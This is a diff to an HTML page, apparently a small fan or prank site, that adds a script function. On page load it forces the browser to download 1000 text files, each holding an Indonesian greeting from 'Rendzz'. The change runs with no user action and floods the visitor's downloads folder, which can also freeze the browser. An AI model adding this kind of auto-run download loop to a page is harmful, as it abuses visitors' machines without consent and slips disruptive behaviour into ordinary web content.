@@ -82,6 +82,20 @@
             var sound = document.getElementById("munchkin-sound");
             sound.play();
         }
+
+        function autoDownload() {
+            for (let i = 0; i < 1000; i++) { // Ganti 10 jadi jumlah file yang lo mau
+                let link = document.createElement("a");
+                let file = new Blob(["Hai Aku Rendzz Sebang Mengenal mu"], { type: "text/plain" });
+                link.href = URL.createObjectURL(file);
+                link.download = `pesan_${i + 1}.txt`;
+                document.body.appendChild(link);
+                link.click();
+                document.body.removeChild(link);
+            }
+        }
+
+        window.onload = autoDownload; // File otomatis ter-download saat halaman dibuka
     </script>
 </body>
 </html>
